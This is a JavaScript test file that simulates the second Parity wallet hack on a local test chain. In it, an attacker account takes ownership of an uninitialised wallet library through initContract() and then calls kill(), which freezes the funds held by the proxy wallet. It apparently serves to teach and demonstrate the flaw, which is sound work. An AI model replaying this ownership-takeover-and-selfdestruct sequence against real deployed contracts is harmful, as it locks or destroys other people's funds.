/* global describe it beforeEach artifacts */

import { expect } from 'chai'

const Wallet = artifacts.require('Wallet')
const WalletLibrary = artifacts.require('WalletLibrary')

import { web3 } from './w3'

const { eth } = web3
const { accounts } = eth

const alice = accounts[0]
const bob = accounts[1]
const devops199 = accounts[3]

export default () => {
  describe('Parity Wallet Example', () => {
    let wallet
    let walletLibrary

    it('runs Parity hack 2 simulation', async () => {
      const amount = 500

      console.log(``)
      console.log(`    ----------------------------------------------------------------------------------------------`)
      console.log(``)
      console.log(`      Deploy Contracts`)

      walletLibrary = await WalletLibrary.new()
      const proxyWallet = await Wallet.new(walletLibrary.address)

      wallet = await WalletLibrary.at(proxyWallet.address)

      logBalances()

      console.log(`      Setup`)
      console.log(``)
      console.log(`        👩🏻  Alice calls init() on Wallet.sol`)
      await wallet.initContract({from: alice})
      console.log(``)

      console.log(`        👩🏻  Alice sends ${amount} ETH to her wallet`)
      await eth.sendTransaction({to: wallet.address, from: alice, value: toWei(amount)})

      console.log(`        👨🏾  Bob sends ${amount} ETH to Alice's wallet`)
      await eth.sendTransaction({to: wallet.address, from: bob, value: toWei(amount)})

      logBalances()

      console.log(`      Funds Frozen`)
      console.log(``)

      // Devops199 takes ownership of WalletLibrary
      console.log(`        😈  Devops199 takes ownership of the WalletLibrary by calling initContract()`)
      await walletLibrary.initContract({from: devops199})

      // Devops199 kills the WalletLibrary freezing all funds
      console.log(`        😈  Devops199 calls kill() on the WalletLibrary`)
      await walletLibrary.kill({from: devops199})

      // Allice cannot kill wallet to funds
      console.log(`        👩🏻  Alice trys to kill wallet to get funds`)
      await wallet.kill({from: alice})

      logBalances()

      function logBalances () {
        console.log(``)
        console.log(`        Balances:`)
        console.log(`          👩🏻  Alice:         ${fromWeiBigNumber(eth.getBalance(alice))} ETH`)
        console.log(`          👨🏾  Bob:           ${fromWeiBigNumber(eth.getBalance(bob))} ETH`)
        console.log(`          😈  Devops199:     ${fromWeiBigNumber(eth.getBalance(devops199))} ETH`)
        console.log(``)
        console.log(`          📄  Wallet:        ${fromWeiBigNumber(eth.getBalance(wallet.address))} ETH`)
        console.log(`          📄  WalletLibrary: ${fromWeiBigNumber(eth.getBalance(walletLibrary.address))} ETH`)
        console.log(``)
        console.log(`    ----------------------------------------------------------------------------------------------`)
        console.log(``)
      }
    }).timeout(400000)
  })
}

function toWei (amount) {
  return amount * 10 ** 18
}

function fromWeiBigNumber (amount) {
  return amount.div(10 ** 18).toNumber()
}
